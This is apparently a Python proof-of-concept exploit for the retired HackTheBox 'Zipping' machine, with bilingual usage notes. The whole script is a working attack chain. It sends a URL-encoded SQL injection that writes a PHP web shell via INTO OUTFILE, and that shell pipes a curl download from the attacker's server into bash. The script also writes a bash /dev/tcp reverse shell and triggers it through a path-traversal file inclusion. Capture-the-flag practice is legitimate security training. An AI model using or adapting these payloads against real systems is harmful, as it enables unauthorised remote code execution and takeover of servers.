#!/usr/bin/env python3
# Fuente / Source: https://github.com/saoGITo/HTB_Zipping (HTB_Zipping_poc.py)
# Fecha de acceso / Accessed: 2026-09-25. Autor notas: Apuromafo (curaduria local).
# Maquina / Machine: HTB Zipping (Easy, retired) - SQLi con INTO OUTFILE a /var/lib/mysql + LFI por traversal.
# Uso / Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>
#   1. echo "10.10.11.229 zipping.htb" >> /etc/hosts
#   2. nc -nvlp 4444
#   3. python3 HTB_Zipping_poc.py 10.10.14.1 4444
import requests
import sys
import subprocess
import random

if len(sys.argv) < 2:
    print("Usage: python3 HTB_Zipping_poc.py <listener ip> <listener port>")
    sys.exit(1)

fnb = random.randint(10, 10000)
url = "http://zipping.htb/"

session = requests.Session()

print("[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp " + f"{sys.argv[2]}")

print("[+] Write php shell /var/lib/mysql/rvsl" + str(fnb) + ".php")

with open('revshell.sh', 'w') as f:
        f.write("#!/bin/bash\n")
        f.write(f"bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1")
proc = subprocess.Popen(["python3", "-m", "http.server", "8000"])
phpshell = session.get(url + f"shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//{sys.argv[1]}:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl{fnb}.php'+%231")

print("[+] Get Reverse Shell")

phpshell = session.get(url + f"shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl{fnb}")

proc.terminate()
